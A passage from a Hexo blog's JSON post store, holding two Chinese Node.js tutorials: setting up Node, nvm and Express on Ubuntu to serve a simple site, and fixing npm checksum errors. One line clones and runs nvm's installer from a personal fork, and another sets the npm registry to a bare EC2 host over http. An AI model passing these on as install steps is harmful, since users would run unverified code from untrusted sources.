./nvm`\n装完nvm之后：\n1.通过nvm ls查看当前已经安装的node或者iojs版本；\n2.通过nvm ls-remote查看当前可以安装的node或者iojs版本；\n3.通过nvm install v0.21.7安装制定版本的nodejs；\n4.通过nvm use v0.21.7切换使用的nodejs版本；\n#### 1.2.3安装npm ####\nnpm是node的包管理工具，使用npm可以很方便地安装一些框架、工具什么的，百度一下安装方法，比较简单，就不说了。\n### 1.2Express安装 ###\n^4 Express是nodeJS的应用框架，提供了强大的工具和特性帮助创建Web应用和HTTP工具，其关系就相当于JQuery、AngularJS之于JS吧，安装：\n```mkdir myapp\ncd myapp\nnpm init 之后一路回车\nnpm install express –save\n```\n# 二、搭建简单Web服务器 #\n## 1. Hello world ##\n进去myapp根目录，创建index.js文件，这是整个web应用的入口。在index.js中输入：\n```\nvar express = require('express');     //引入express框架\nvar app = express();                  //实例化一个express app\n\napp.get('/', function (req, res) {  \n  res.send('Hello World!');     //当使用get请求根目录时，服务器返回’Hello World！’\n});\n\napp.listen(3000, function () {    //监听3000窗口，监听成功后打印log\n  console.log('Example app listening on port 3000!');\n});\n```\n至此，最简单的一个服务器已经建好了，启动方法：\n```\ncd  myapp\nnode index.js\n```\n这时在浏览器中打开localhost:3000，页面上有”Hello World！”\n## 2. 展示静态文件 ##\n假设你重构了一个静态页面login.html，想要放在这个web服务器上进行展示。假设你的静态文件结构是这样的：login文件夹下放着login.html、style.css、login.js和存放图片的img文件夹。那么把login文件夹放到myapp根目录下，并把index.js修改为：\n\n```\nvar express = require('express');     \nvar app = express();              \n \napp.use(express.static('login'));  //使用express的static方法展示静态文件\n\napp.listen(3000, function () {    \n  console.log('Example app listening on port 3000!');\n});\n```\n然后用浏览器访问localhost:3000/login.html就能展示出你的静态页面了\n## 3. 配置路由 ##\n上面代码中的这行就是配置路由的部分：\n```  \n  app.use(express.static('login'));  //使用express的static方法展示静态文件\n```\n其基本结构是：`app.METHOD(PATH, HANDLER)`，这里的method可以是get、post，PATH就是在浏览器中输入的地址路径，在HANDLER函数里面对服务器返回的内容进行设定。通过修改这三项就可以对访问路径和服务器相应内容进行配置了。                                             \n\n---\n> 本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 miao.hnlk@gmail.com\n> 本文地址：[developing-a-simple-web-server-with-node-js](http://supermaryy.com/2016/10/22/developing-a-simple-web-server-with-node-js/)\n\nReference：\n\n^1:[ nodejs各版本的区别](http://cnodejs.org/topic/5762549a50312f1107e615d7)\n^2:[ Node.js与io.js那些事儿](http://www.infoq.com/cn/articles/node-js-and-io-js/)\n^3:[在Linux（ubuntu server）上面安装NodeJS的正确姿势](http://www.cnblogs.com/chenxizhang/p/5222918.html)\n^4:[expressjs 官网](http://expressjs.com/en/starter/installing.html)\n\n\n\n\n","source":"_posts/developing-a-simple-web-server-with-node-js.md","raw":"---\ntitle: 使用Node.js搭建简单Web服务器\ndate: 2016-10-22 00:30:00\ncategories: Node.js\ntags: [Node.js,Express,web server,教程] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n摘要：\n1. Ubuntu下Node.js和Express安装\n2. 搭建简单Web服务器\n\n<!-- more -->\n\n> by MaryTien from  [http://supermaryy.com](http://luckymona.github.com)\n> 本文地址：[developing-a-simple-web-server-with-node-js](http://supermaryy.com/2016/10/22/developing-a-simple-web-server-with-node-js/)\n \n# 一、环境搭建：Ubuntu下node和express安装 #\n第一次玩ubuntu加上公司网络比较弱鸡限制了好多网站，node官网上的安装包下载不了，一开始装node还费了老大劲，连滚带爬装上了node，现在总结一下怎么安装的，不然以后用到还得重新摸索。如有错漏，欢迎批评。\n\n## 1. Node安装 ##\n### 1.1关于node版本 ###\nnode查看版本使用命令node –v，我装上后查看显示是0.10.x的版本，但是官网上的都是4.x.x和6.x.x的版本了，很明显这应该使用的不同的版本管理体系。查到二者区别说：0.x.x是Joyent公司维护.进展缓慢，但是稳定；4.,5.*都是由网友维护的，相对的进展快，增加和许多新功能，io.js也是指的这个开源版本。偶数开头的是稳定版，奇数开头的开发版就是会不断变化更新，为下一个稳定版本做测试差不多的意思^1。关于node.js和io.js背后还有一段精彩的故事^2。\n### 1.2Ubuntu安装node：### \n#### 1.2.1tar.gz安装 ####\n^3到node官网上下载安装包，Ubuntu上需要使用.tar.gz结尾的文件进行安装，下载到后，假设放在主文件夹,文件名是name.tar.gz\n快捷键ctrl+alt+t打开终端，`tar -zxvf name.tar.gz`进行解压，假设解压为name文件夹:\n```\ncd name\nsudo make\nsudo make install\n```\n等待安装完成即可\n#### 1.2.2使用nvm管理安装的node版本 ####\n先安装nvm：\n`git clone https://github.com/chenxizhang/nvm.git && ./nvm/install.sh && . ~/.nvm/nvm.sh  && rm –rf ./nvm`\n装完nvm之后：\n1.通过nvm ls查看当前已经安装的node或者iojs版本；\n2.通过nvm ls-remote查看当前可以安装的node或者iojs版本；\n3.通过nvm install v0.21.7安装制定版本的nodejs；\n4.通过nvm use v0.21.7切换使用的nodejs版本；\n#### 1.2.3安装npm ####\nnpm是node的包管理工具，使用npm可以很方便地安装一些框架、工具什么的，百度一下安装方法，比较简单，就不说了。\n### 1.2Express安装 ###\n^4 Express是nodeJS的应用框架，提供了强大的工具和特性帮助创建Web应用和HTTP工具，其关系就相当于JQuery、AngularJS之于JS吧，安装：\n```mkdir myapp\ncd myapp\nnpm init 之后一路回车\nnpm install express –save\n```\n# 二、搭建简单Web服务器 #\n## 1. Hello world ##\n进去myapp根目录，创建index.js文件，这是整个web应用的入口。在index.js中输入：\n```\nvar express = require('express');     //引入express框架\nvar app = express();                  //实例化一个express app\n\napp.get('/', function (req, res) {  \n  res.send('Hello World!');     //当使用get请求根目录时，服务器返回’Hello World！’\n});\n\napp.listen(3000, function () {    //监听3000窗口，监听成功后打印log\n  console.log('Example app listening on port 3000!');\n});\n```\n至此，最简单的一个服务器已经建好了，启动方法：\n```\ncd  myapp\nnode index.js\n```\n这时在浏览器中打开localhost:3000，页面上有”Hello World！”\n## 2. 展示静态文件 ##\n假设你重构了一个静态页面login.html，想要放在这个web服务器上进行展示。假设你的静态文件结构是这样的：login文件夹下放着login.html、style.css、login.js和存放图片的img文件夹。那么把login文件夹放到myapp根目录下，并把index.js修改为：\n\n```\nvar express = require('express');     \nvar app = express();              \n \napp.use(express.static('login'));  //使用express的static方法展示静态文件\n\napp.listen(3000, function () {    \n  console.log('Example app listening on port 3000!');\n});\n```\n然后用浏览器访问localhost:3000/login.html就能展示出你的静态页面了\n## 3. 配置路由 ##\n上面代码中的这行就是配置路由的部分：\n```  \n  app.use(express.static('login'));  //使用express的static方法展示静态文件\n```\n其基本结构是：`app.METHOD(PATH, HANDLER)`，这里的method可以是get、post，PATH就是在浏览器中输入的地址路径，在HANDLER函数里面对服务器返回的内容进行设定。通过修改这三项就可以对访问路径和服务器相应内容进行配置了。                                             \n\n---\n> 本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 miao.hnlk@gmail.com\n> 本文地址：[developing-a-simple-web-server-with-node-js](http://supermaryy.com/2016/10/22/developing-a-simple-web-server-with-node-js/)\n\nReference：\n\n^1:[ nodejs各版本的区别](http://cnodejs.org/topic/5762549a50312f1107e615d7)\n^2:[ Node.js与io.js那些事儿](http://www.infoq.com/cn/articles/node-js-and-io-js/)\n^3:[在Linux（ubuntu server）上面安装NodeJS的正确姿势](http://www.cnblogs.com/chenxizhang/p/5222918.html)\n^4:[expressjs 官网](http://expressjs.com/en/starter/installing.html)\n\n\n\n\n","slug":"developing-a-simple-web-server-with-node-js","published":1,"updated":"2018-05-07T10:29:59.531Z","layout":"post","photos":[],"link":"","_id":"cjgw4445k000c8d95z1y5htfg","content":"<p>摘要：</p>\n<ol>\n<li>Ubuntu下Node.js和Express安装</li>\n<li>搭建简单Web服务器</li>\n</ol>\n<a id=\"more\"></a>\n<blockquote>\n<p>by MaryTien from  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a><br>本文地址：<a href=\"http://supermaryy.com/2016/10/22/developing-a-simple-web-server-with-node-js/\">developing-a-simple-web-server-with-node-js</a></p>\n</blockquote>\n<h1 id=\"一、环境搭建：Ubuntu下node和express安装\"><a href=\"#一、环境搭建：Ubuntu下node和express安装\" class=\"headerlink\" title=\"一、环境搭建：Ubuntu下node和express安装\"></a>一、环境搭建：Ubuntu下node和express安装</h1><p>第一次玩ubuntu加上公司网络比较弱鸡限制了好多网站，node官网上的安装包下载不了，一开始装node还费了老大劲，连滚带爬装上了node，现在总结一下怎么安装的，不然以后用到还得重新摸索。如有错漏，欢迎批评。</p>\n<h2 id=\"1-Node安装\"><a href=\"#1-Node安装\" class=\"headerlink\" title=\"1. Node安装\"></a>1. Node安装</h2><h3 id=\"1-1关于node版本\"><a href=\"#1-1关于node版本\" class=\"headerlink\" title=\"1.1关于node版本\"></a>1.1关于node版本</h3><p>node查看版本使用命令node –v，我装上后查看显示是0.10.x的版本，但是官网上的都是4.x.x和6.x.x的版本了，很明显这应该使用的不同的版本管理体系。查到二者区别说：0.x.x是Joyent公司维护.进展缓慢，但是稳定；4.,5.*都是由网友维护的，相对的进展快，增加和许多新功能，io.js也是指的这个开源版本。偶数开头的是稳定版，奇数开头的开发版就是会不断变化更新，为下一个稳定版本做测试差不多的意思^1。关于node.js和io.js背后还有一段精彩的故事^2。</p>\n<h3 id=\"1-2Ubuntu安装node：\"><a href=\"#1-2Ubuntu安装node：\" class=\"headerlink\" title=\"1.2Ubuntu安装node：\"></a>1.2Ubuntu安装node：</h3><h4 id=\"1-2-1tar-gz安装\"><a href=\"#1-2-1tar-gz安装\" class=\"headerlink\" title=\"1.2.1tar.gz安装\"></a>1.2.1tar.gz安装</h4><p>^3到node官网上下载安装包，Ubuntu上需要使用.tar.gz结尾的文件进行安装，下载到后，假设放在主文件夹,文件名是name.tar.gz<br>快捷键ctrl+alt+t打开终端，<code>tar -zxvf name.tar.gz</code>进行解压，假设解压为name文件夹:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd name</span><br><span class=\"line\">sudo make</span><br><span class=\"line\">sudo make install</span><br></pre></td></tr></table></figure></p>\n<p>等待安装完成即可</p>\n<h4 id=\"1-2-2使用nvm管理安装的node版本\"><a href=\"#1-2-2使用nvm管理安装的node版本\" class=\"headerlink\" title=\"1.2.2使用nvm管理安装的node版本\"></a>1.2.2使用nvm管理安装的node版本</h4><p>先安装nvm：<br><code>git clone https://github.com/chenxizhang/nvm.git &amp;&amp; ./nvm/install.sh &amp;&amp; . ~/.nvm/nvm.sh  &amp;&amp; rm –rf ./nvm</code><br>装完nvm之后：<br>1.通过nvm ls查看当前已经安装的node或者iojs版本；<br>2.通过nvm ls-remote查看当前可以安装的node或者iojs版本；<br>3.通过nvm install v0.21.7安装制定版本的nodejs；<br>4.通过nvm use v0.21.7切换使用的nodejs版本；</p>\n<h4 id=\"1-2-3安装npm\"><a href=\"#1-2-3安装npm\" class=\"headerlink\" title=\"1.2.3安装npm\"></a>1.2.3安装npm</h4><p>npm是node的包管理工具，使用npm可以很方便地安装一些框架、工具什么的，百度一下安装方法，比较简单，就不说了。</p>\n<h3 id=\"1-2Express安装\"><a href=\"#1-2Express安装\" class=\"headerlink\" title=\"1.2Express安装\"></a>1.2Express安装</h3><p>^4 Express是nodeJS的应用框架，提供了强大的工具和特性帮助创建Web应用和HTTP工具，其关系就相当于JQuery、AngularJS之于JS吧，安装：<br><figure class=\"highlight plain\"><figcaption><span>myapp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd myapp</span><br><span class=\"line\">npm init 之后一路回车</span><br><span class=\"line\">npm install express –save</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"二、搭建简单Web服务器\"><a href=\"#二、搭建简单Web服务器\" class=\"headerlink\" title=\"二、搭建简单Web服务器\"></a>二、搭建简单Web服务器</h1><h2 id=\"1-Hello-world\"><a href=\"#1-Hello-world\" class=\"headerlink\" title=\"1. Hello world\"></a>1. Hello world</h2><p>进去myapp根目录，创建index.js文件，这是整个web应用的入口。在index.js中输入：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var express = require(&apos;express&apos;);     //引入express框架</span><br><span class=\"line\">var app = express();                  //实例化一个express app</span><br><span class=\"line\"></span><br><span class=\"line\">app.get(&apos;/&apos;, function (req, res) &#123;  </span><br><span class=\"line\">  res.send(&apos;Hello World!&apos;);     //当使用get请求根目录时，服务器返回’Hello World！’</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.listen(3000, function () &#123;    //监听3000窗口，监听成功后打印log</span><br><span class=\"line\">  console.log(&apos;Example app listening on port 3000!&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>至此，最简单的一个服务器已经建好了，启动方法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd  myapp</span><br><span class=\"line\">node index.js</span><br></pre></td></tr></table></figure></p>\n<p>这时在浏览器中打开localhost:3000，页面上有”Hello World！”</p>\n<h2 id=\"2-展示静态文件\"><a href=\"#2-展示静态文件\" class=\"headerlink\" title=\"2. 展示静态文件\"></a>2. 展示静态文件</h2><p>假设你重构了一个静态页面login.html，想要放在这个web服务器上进行展示。假设你的静态文件结构是这样的：login文件夹下放着login.html、style.css、login.js和存放图片的img文件夹。那么把login文件夹放到myapp根目录下，并把index.js修改为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var express = require(&apos;express&apos;);     </span><br><span class=\"line\">var app = express();              </span><br><span class=\"line\"> </span><br><span class=\"line\">app.use(express.static(&apos;login&apos;));  //使用express的static方法展示静态文件</span><br><span class=\"line\"></span><br><span class=\"line\">app.listen(3000, function () &#123;    </span><br><span class=\"line\">  console.log(&apos;Example app listening on port 3000!&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>然后用浏览器访问localhost:3000/login.html就能展示出你的静态页面了</p>\n<h2 id=\"3-配置路由\"><a href=\"#3-配置路由\" class=\"headerlink\" title=\"3. 配置路由\"></a>3. 配置路由</h2><p>上面代码中的这行就是配置路由的部分：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.use(express.static(&apos;login&apos;));  //使用express的static方法展示静态文件</span><br></pre></td></tr></table></figure></p>\n<p>其基本结构是：<code>app.METHOD(PATH, HANDLER)</code>，这里的method可以是get、post，PATH就是在浏览器中输入的地址路径，在HANDLER函数里面对服务器返回的内容进行设定。通过修改这三项就可以对访问路径和服务器相应内容进行配置了。                                             </p>\n<hr>\n<blockquote>\n<p>本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 <a href=\"mailto:miao.hnlk@gmail.com\" target=\"_blank\" rel=\"noopener\">miao.hnlk@gmail.com</a><br>本文地址：<a href=\"http://supermaryy.com/2016/10/22/developing-a-simple-web-server-with-node-js/\">developing-a-simple-web-server-with-node-js</a></p>\n</blockquote>\n<p>Reference：</p>\n<p>^1:<a href=\"http://cnodejs.org/topic/5762549a50312f1107e615d7\" target=\"_blank\" rel=\"noopener\"> nodejs各版本的区别</a><br>^2:<a href=\"http://www.infoq.com/cn/articles/node-js-and-io-js/\" target=\"_blank\" rel=\"noopener\"> Node.js与io.js那些事儿</a><br>^3:<a href=\"http://www.cnblogs.com/chenxizhang/p/5222918.html\" target=\"_blank\" rel=\"noopener\">在Linux（ubuntu server）上面安装NodeJS的正确姿势</a><br>^4:<a href=\"http://expressjs.com/en/starter/installing.html\" target=\"_blank\" rel=\"noopener\">expressjs 官网</a></p>\n","site":{"data":{}},"excerpt":"<p>摘要：</p>\n<ol>\n<li>Ubuntu下Node.js和Express安装</li>\n<li>搭建简单Web服务器</li>\n</ol>","more":"<blockquote>\n<p>by MaryTien from  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a><br>本文地址：<a href=\"http://supermaryy.com/2016/10/22/developing-a-simple-web-server-with-node-js/\">developing-a-simple-web-server-with-node-js</a></p>\n</blockquote>\n<h1 id=\"一、环境搭建：Ubuntu下node和express安装\"><a href=\"#一、环境搭建：Ubuntu下node和express安装\" class=\"headerlink\" title=\"一、环境搭建：Ubuntu下node和express安装\"></a>一、环境搭建：Ubuntu下node和express安装</h1><p>第一次玩ubuntu加上公司网络比较弱鸡限制了好多网站，node官网上的安装包下载不了，一开始装node还费了老大劲，连滚带爬装上了node，现在总结一下怎么安装的，不然以后用到还得重新摸索。如有错漏，欢迎批评。</p>\n<h2 id=\"1-Node安装\"><a href=\"#1-Node安装\" class=\"headerlink\" title=\"1. Node安装\"></a>1. Node安装</h2><h3 id=\"1-1关于node版本\"><a href=\"#1-1关于node版本\" class=\"headerlink\" title=\"1.1关于node版本\"></a>1.1关于node版本</h3><p>node查看版本使用命令node –v，我装上后查看显示是0.10.x的版本，但是官网上的都是4.x.x和6.x.x的版本了，很明显这应该使用的不同的版本管理体系。查到二者区别说：0.x.x是Joyent公司维护.进展缓慢，但是稳定；4.,5.*都是由网友维护的，相对的进展快，增加和许多新功能，io.js也是指的这个开源版本。偶数开头的是稳定版，奇数开头的开发版就是会不断变化更新，为下一个稳定版本做测试差不多的意思^1。关于node.js和io.js背后还有一段精彩的故事^2。</p>\n<h3 id=\"1-2Ubuntu安装node：\"><a href=\"#1-2Ubuntu安装node：\" class=\"headerlink\" title=\"1.2Ubuntu安装node：\"></a>1.2Ubuntu安装node：</h3><h4 id=\"1-2-1tar-gz安装\"><a href=\"#1-2-1tar-gz安装\" class=\"headerlink\" title=\"1.2.1tar.gz安装\"></a>1.2.1tar.gz安装</h4><p>^3到node官网上下载安装包，Ubuntu上需要使用.tar.gz结尾的文件进行安装，下载到后，假设放在主文件夹,文件名是name.tar.gz<br>快捷键ctrl+alt+t打开终端，<code>tar -zxvf name.tar.gz</code>进行解压，假设解压为name文件夹:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd name</span><br><span class=\"line\">sudo make</span><br><span class=\"line\">sudo make install</span><br></pre></td></tr></table></figure></p>\n<p>等待安装完成即可</p>\n<h4 id=\"1-2-2使用nvm管理安装的node版本\"><a href=\"#1-2-2使用nvm管理安装的node版本\" class=\"headerlink\" title=\"1.2.2使用nvm管理安装的node版本\"></a>1.2.2使用nvm管理安装的node版本</h4><p>先安装nvm：<br><code>git clone https://github.com/chenxizhang/nvm.git &amp;&amp; ./nvm/install.sh &amp;&amp; . ~/.nvm/nvm.sh  &amp;&amp; rm –rf ./nvm</code><br>装完nvm之后：<br>1.通过nvm ls查看当前已经安装的node或者iojs版本；<br>2.通过nvm ls-remote查看当前可以安装的node或者iojs版本；<br>3.通过nvm install v0.21.7安装制定版本的nodejs；<br>4.通过nvm use v0.21.7切换使用的nodejs版本；</p>\n<h4 id=\"1-2-3安装npm\"><a href=\"#1-2-3安装npm\" class=\"headerlink\" title=\"1.2.3安装npm\"></a>1.2.3安装npm</h4><p>npm是node的包管理工具，使用npm可以很方便地安装一些框架、工具什么的，百度一下安装方法，比较简单，就不说了。</p>\n<h3 id=\"1-2Express安装\"><a href=\"#1-2Express安装\" class=\"headerlink\" title=\"1.2Express安装\"></a>1.2Express安装</h3><p>^4 Express是nodeJS的应用框架，提供了强大的工具和特性帮助创建Web应用和HTTP工具，其关系就相当于JQuery、AngularJS之于JS吧，安装：<br><figure class=\"highlight plain\"><figcaption><span>myapp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd myapp</span><br><span class=\"line\">npm init 之后一路回车</span><br><span class=\"line\">npm install express –save</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"二、搭建简单Web服务器\"><a href=\"#二、搭建简单Web服务器\" class=\"headerlink\" title=\"二、搭建简单Web服务器\"></a>二、搭建简单Web服务器</h1><h2 id=\"1-Hello-world\"><a href=\"#1-Hello-world\" class=\"headerlink\" title=\"1. Hello world\"></a>1. Hello world</h2><p>进去myapp根目录，创建index.js文件，这是整个web应用的入口。在index.js中输入：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var express = require(&apos;express&apos;);     //引入express框架</span><br><span class=\"line\">var app = express();                  //实例化一个express app</span><br><span class=\"line\"></span><br><span class=\"line\">app.get(&apos;/&apos;, function (req, res) &#123;  </span><br><span class=\"line\">  res.send(&apos;Hello World!&apos;);     //当使用get请求根目录时，服务器返回’Hello World！’</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.listen(3000, function () &#123;    //监听3000窗口，监听成功后打印log</span><br><span class=\"line\">  console.log(&apos;Example app listening on port 3000!&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>至此，最简单的一个服务器已经建好了，启动方法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd  myapp</span><br><span class=\"line\">node index.js</span><br></pre></td></tr></table></figure></p>\n<p>这时在浏览器中打开localhost:3000，页面上有”Hello World！”</p>\n<h2 id=\"2-展示静态文件\"><a href=\"#2-展示静态文件\" class=\"headerlink\" title=\"2. 展示静态文件\"></a>2. 展示静态文件</h2><p>假设你重构了一个静态页面login.html，想要放在这个web服务器上进行展示。假设你的静态文件结构是这样的：login文件夹下放着login.html、style.css、login.js和存放图片的img文件夹。那么把login文件夹放到myapp根目录下，并把index.js修改为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var express = require(&apos;express&apos;);     </span><br><span class=\"line\">var app = express();              </span><br><span class=\"line\"> </span><br><span class=\"line\">app.use(express.static(&apos;login&apos;));  //使用express的static方法展示静态文件</span><br><span class=\"line\"></span><br><span class=\"line\">app.listen(3000, function () &#123;    </span><br><span class=\"line\">  console.log(&apos;Example app listening on port 3000!&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>然后用浏览器访问localhost:3000/login.html就能展示出你的静态页面了</p>\n<h2 id=\"3-配置路由\"><a href=\"#3-配置路由\" class=\"headerlink\" title=\"3. 配置路由\"></a>3. 配置路由</h2><p>上面代码中的这行就是配置路由的部分：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.use(express.static(&apos;login&apos;));  //使用express的static方法展示静态文件</span><br></pre></td></tr></table></figure></p>\n<p>其基本结构是：<code>app.METHOD(PATH, HANDLER)</code>，这里的method可以是get、post，PATH就是在浏览器中输入的地址路径，在HANDLER函数里面对服务器返回的内容进行设定。通过修改这三项就可以对访问路径和服务器相应内容进行配置了。                                             </p>\n<hr>\n<blockquote>\n<p>本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 <a href=\"mailto:miao.hnlk@gmail.com\" target=\"_blank\" rel=\"noopener\">miao.hnlk@gmail.com</a><br>本文地址：<a href=\"http://supermaryy.com/2016/10/22/developing-a-simple-web-server-with-node-js/\">developing-a-simple-web-server-with-node-js</a></p>\n</blockquote>\n<p>Reference：</p>\n<p>^1:<a href=\"http://cnodejs.org/topic/5762549a50312f1107e615d7\" target=\"_blank\" rel=\"noopener\"> nodejs各版本的区别</a><br>^2:<a href=\"http://www.infoq.com/cn/articles/node-js-and-io-js/\" target=\"_blank\" rel=\"noopener\"> Node.js与io.js那些事儿</a><br>^3:<a href=\"http://www.cnblogs.com/chenxizhang/p/5222918.html\" target=\"_blank\" rel=\"noopener\">在Linux（ubuntu server）上面安装NodeJS的正确姿势</a><br>^4:<a href=\"http://expressjs.com/en/starter/installing.html\" target=\"_blank\" rel=\"noopener\">expressjs 官网</a></p>"},{"title":"npm ERR! shasum check failed for报错，解决办法","date":"2016-06-02T05:30:00.000Z","toc":true,"comments":1,"_content":"\n使用npm install的时候，死活报错：\n```\nnpm ERR! shasum check failed for C:\\Users\\MARY~1.TIE\\AppData\\Local\\Temp\\npm-1212\n-7fb4bd00\\registry.cnpmjs.org\\iconv-lite\\download\\iconv-lite-0.4.11.tgz\n```\n<!-- More -->\n网上这个问题搜到挺多答案的，但是试了好多都不行，\n### 现在列出我试过的,这些试过来都不行： ###\n来自[这个链接的方案](http://www.ithao123.cn/content-41081.html)\n1. 通过config命令\n```\nnpm config set registry http://registry.cnpmjs.org \nnpm info underscore （如果上面配置正确这个命令会有字符串response）\n```\n2. 命令行指定\n`npm --registry http://registry.cnpmjs.org` info underscore\n3. 编辑 ~/.npmrc 加入下面内容\n`registry = http://registry.cnpmjs.org`\n搜索镜像: http://cnpmjs.org\n\n最后在starkoverflow的这个[链接](http://stackoverflow.com/questions/20633898/shasum-check-failed-error-while-installing-phonegap)，试到了正解：\n### 可行的方案 ###\n1. Try this first\n`npm set registry https://registry.npmjs.org/`\n2. if failed then try to use the npm mirror:\n`npm set registry http://ec2-46-137-149-160.eu-west-1.compute.amazonaws.com`\n3. then use it normally:\n`npm install express`\n\n我只用了第一句就不再报错了，之前使用的cnpm.js，这个小叛徒，给我造成这么多err，还是原版、官方靠谱","source":"_posts/npm ERR! shasum check failed for.md","raw":"---\ntitle: npm ERR! shasum check failed for报错，解决办法\ndate: 2016-6-2 13:30:00\ncategories: NodeJS\ntags: [踩坑,npm,nodeJS] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n\n使用npm install的时候，死活报错：\n```\nnpm ERR! shasum check failed for C:\\Users\\MARY~1.TIE\\AppData\\Local\\Temp\\npm-1212\n-7fb4bd00\\registry.cnpmjs.org\\iconv-lite\\download\\iconv-lite-0.4.11.tgz\n```\n<!-- More -->\n网上这个问题搜到挺多答案的，但是试了好多都不行，\n### 现在列出我试过的,这些试过来都不行： ###\n来自[这个链接的方案](http://www.ithao123.cn/content-41081.html)\n1. 通过config命令\n```\nnpm config set registry http://registry.cnpmjs.org \nnpm info underscore （如果上面配置正确这个命令会有字符串response）\n```\n2. 命令行指定\n`npm --registry http://registry.cnpmjs.org` info underscore\n3. 编辑 ~/.npmrc 加入下面内容\n`registry = http://registry.cnpmjs.org`\n搜索镜像: http://cnpmjs.org\n\n最后在starkoverflow的这个[链接](http://stackoverflow.com/questions/20633898/shasum-check-failed-error-while-installing-phonegap)，试到了正解：\n### 可行的方案 ###\n1. Try this first\n`npm set registry https://registry.npmjs.org/`\n2. if failed then try to use the npm mirror:\n`npm set registry http://ec2-46-137-149-160.eu-west-1.compute.amazonaws.com`\n3. then use it normally:\n`npm install express`\n\n我只用了第一句就不再报错了，之前使用的cnpm.js，这个小叛徒，给我造成这么多err，还是原版、官方靠谱","slug":"npm ERR! shasum check failed for","published":1,"updated":"2018-05-07T10:29:59.568Z","layout":"post","photos":[],"link":"","_id":"cjgw4445u000d8d95k3dkr8uk","content":"<p>使用npm install的时候，死活报错：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm ERR! shasum check failed for C:\\Users\\MARY~1.TIE\\AppData\\Local\\Temp\\npm-1212</span><br><span class=\"line\">-7fb4bd00\\registry.cnpmjs.org\\iconv-lite\\download\\iconv-lite-0.4.11.tgz</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>网上这个问题搜到挺多答案的，但是试了好多都不行，</p>\n<h3 id=\"现在列出我试过的-这些试过来都不行：\"><a href=\"#现在列出我试过的-这些试过来都不行：\" class=\"headerlink\" title=\"现在列出我试过的,这些试过来都不行：\"></a>现在列出我试过的,这些试过来都不行：</h3><p>来自<a href=\"http://www.ithao123.cn/content-41081.html\" target=\"_blank\" 